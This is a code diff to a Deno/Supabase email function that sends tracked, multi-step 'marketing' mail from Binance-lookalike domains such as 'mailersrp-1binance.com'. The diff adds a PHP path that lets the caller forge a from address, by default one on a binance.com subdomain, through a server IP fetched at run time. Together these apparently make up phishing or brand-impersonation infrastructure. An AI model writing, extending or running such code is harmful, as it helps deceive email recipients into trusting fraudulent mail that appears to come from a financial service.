@@ -142,19 +142,31 @@ const handler = async (req: Request): Promise<Response> => {
       );
     }
 
-    // Select API key and domain based on user choice
-    let apiKey = Deno.env.get("RESEND_API_KEY"); // Default domain 1
-    let fromDomain = "mailersrp-1binance.com";
-    
-    if (domain === "domain2") {
-      apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
-      fromDomain = "mailersrp-2binance.com";
-    }
-    
-    // Initialize Resend with the selected API key
-    resend = new Resend(apiKey);
-    
-    console.log('Using domain:', fromDomain);
+      // Select API key and domain based on commercial's preference
+      let apiKey = Deno.env.get("RESEND_API_KEY"); // Default domain 1
+      let fromDomain = "mailersrp-1binance.com";
+      let sendMethod = 'resend'; // default method
+      
+      // Get commercial's email preferences
+      const { data: commercialData } = await supabase
+        .from('commercials')
+        .select('email_domain_preference, email_alias_from')
+        .eq('id', commercial_id)
+        .single();
+      
+      const emailPreference = commercialData?.email_domain_preference || domain || 'domain1';
+      
+      if (emailPreference === "domain2") {
+        apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
+        fromDomain = "mailersrp-2binance.com";
+        sendMethod = 'resend';
+      } else if (emailPreference === "alias") {
+        // Use PHP sending method with alias
+        sendMethod = 'php';
+        fromDomain = commercialData?.email_alias_from || "do_not_reply@mailersp2.binance.com";
+      }
+      
+      console.log('Using method:', sendMethod, 'domain/alias:', fromDomain);
 
     // Fetch the current server IP from the database
     const { data: serverConfig, error: configError } = await supabase
@@ -446,29 +458,95 @@ const handler = async (req: Request): Promise<Response> => {
     console.log("Sending email to:", to, "with tracking code:", trackingCode);
     console.log("Server IP used:", currentServerIp);
     console.log("Sender name:", senderName);
+    console.log("Send method:", sendMethod);
 
-    const emailResponse = await resend.emails.send({
-      from: fromDomain === "mailersrp-2binance.com" 
-        ? `${senderName} <noreply@mailersrp-2binance.com>`
-        : `${senderName} <donotreply@mailersrp-1binance.com>`,
-      to: [to],
-      subject: emailSubject,
-      html: emailContent,
-      tags: [
-        {
-          name: 'campaign',
-          value: 'wireguard-marketing'
-        },
-        {
-          name: 'tracking_code',
-          value: trackingCode
-        },
-        {
-          name: 'step',
-          value: step ? `step-${step}` : 'step-1'
+    let emailResponse;
+    
+    if (sendMethod === 'php') {
+      // Send via PHP with alias
+      try {
+        const phpResponse = await fetch(`http://${currentServerIp}/send_email.php`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: new URLSearchParams({
+            to: to,
+            subject: emailSubject,
+            message: emailContent,
+            from_email: fromDomain,
+            from_name: senderName,
+            tracking_code: trackingCode
+          }).toString()
+        });
+        
+        if (!phpResponse.ok) {
+          throw new Error(`PHP sending failed: ${phpResponse.statusText}`);
         }
-      ]
-    });
+        
+        const phpResult = await phpResponse.text();
+        console.log('PHP send result:', phpResult);
+        
+        emailResponse = {
+          id: `php_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+          data: { success: true, method: 'php' }
+        };
+      } catch (phpError) {
+        console.error('PHP sending failed, fallback to Resend:', phpError);
+        // Fallback to Resend if PHP fails
+        if (!resend) {
+          resend = new Resend(apiKey);
+        }
+        emailResponse = await resend.emails.send({
+          from: `${senderName} <donotreply@mailersrp-1binance.com>`,
+          to: [to],
+          subject: emailSubject,
+          html: emailContent,
+          tags: [
+            {
+              name: 'campaign',
+              value: 'wireguard-marketing'
+            },
+            {
+              name: 'tracking_code',
+              value: trackingCode
+            },
+            {
+              name: 'step',
+              value: step ? `step-${step}` : 'step-1'
+            }
+          ]
+        });
+      }
+    } else {
+      // Send via Resend API
+      if (!resend) {
+        resend = new Resend(apiKey);
+      }
+      
+      emailResponse = await resend.emails.send({
+        from: fromDomain === "mailersrp-2binance.com" 
+          ? `${senderName} <noreply@mailersrp-2binance.com>`
+          : `${senderName} <donotreply@mailersrp-1binance.com>`,
+        to: [to],
+        subject: emailSubject,
+        html: emailContent,
+        tags: [
+          {
+            name: 'campaign',
+            value: 'wireguard-marketing'
+          },
+          {
+            name: 'tracking_code',
+            value: trackingCode
+          },
+          {
+            name: 'step',
+            value: step ? `step-${step}` : 'step-1'
+          }
+        ]
+      });
+    }
 
     console.log("Marketing email sent successfully:", emailResponse);
 
@@ -630,7 +708,7 @@ Tracking: ${trackingCode}`
       subject: emailSubject,
       status: 'sent',
       sent_at: new Date().toISOString(),
-      resend_id: emailResponse.data?.id,
+      resend_id: emailResponse?.id || emailResponse?.data?.id || null,
       commercial_id: commercial_id
     });
 
